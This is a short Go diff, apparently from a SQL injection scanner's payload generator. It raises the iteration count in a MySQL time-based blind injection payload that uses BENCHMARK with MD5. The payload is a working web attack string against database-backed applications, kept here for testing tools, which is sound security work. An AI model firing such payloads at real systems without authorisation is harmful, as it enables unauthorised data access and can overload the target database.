@@ -101,7 +101,7 @@ func (g *PolyglotGenerator) GenerateTimeBasedPolyglots() []Polyglot {
 			DBMS:        []string{"MySQL"},
 		},
 		{
-			Payload:     "' AND BENCHMARK(1000000,MD5('A'))--",
+			Payload:     "' AND BENCHMARK(10000000,MD5('A'))--",
 			Description: "MySQL benchmark-based delay - computationally expensive operation",
 			DBMS:        []string{"MySQL"},
 		},
